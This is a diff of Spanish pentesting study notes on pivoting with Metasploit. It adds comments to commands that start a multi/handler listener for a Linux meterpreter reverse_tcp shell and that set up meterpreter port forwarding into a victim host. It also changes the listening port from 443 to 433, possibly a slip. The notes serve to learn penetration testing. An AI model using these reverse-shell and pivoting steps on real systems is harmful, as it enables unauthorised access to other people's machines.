@@ -8,8 +8,8 @@ Tags: #Pivoting #Metasploit #PortForwarding
 
 	❯ use multi/handler            # Así nos pondremos en escucha en nuestra maquina de atacante              
 	❯ options
-	❯ set LHOST 192.168.68.1                     
-	❯ set LPORT 443
+	❯ set LHOST 192.168.68.1       # IP de la maquina de atacante                 
+	❯ set LPORT 433                # Puerto de escucha en la maquina de atacante 
 	❯ set payload linux/x86/meterpreter/reverse_tcp
 	❯ run
 ```
@@ -56,7 +56,7 @@ meterpreter❯ portfwd add -l <PORT_Atacante> -p <PORT_Victima> -r <IP_Victima>
 	# PORT = Es el puerto que hemos puesto en el comando anterior que ibamos a abrir de nuestra maquina de atacante 
 ```
 
-## Segunda forma 
+## Segunda forma (Traes puertos individuales de la maquina victima)
 
 ```bash 
 # Comandos con Meterpreter 
